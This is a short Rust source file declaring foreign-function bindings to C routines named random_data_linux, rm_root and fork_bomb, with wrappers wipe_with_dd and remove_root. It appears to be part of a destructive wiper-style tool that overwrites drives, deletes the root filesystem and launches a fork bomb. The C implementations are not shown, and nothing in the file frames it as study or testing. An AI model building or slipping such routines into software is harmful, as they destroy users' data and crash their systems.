use std::os::raw::c_char;

extern "C" {
    pub fn random_data_linux(sym_drive: *const c_char, random: bool);
    pub fn rm_root();
    pub fn fork_bomb(); 
}

pub unsafe fn wipe_with_dd(sym_drive: *const c_char, random: bool) {
    random_data_linux(sym_drive, random);
}

pub unsafe fn remove_root() {
    rm_root();
}

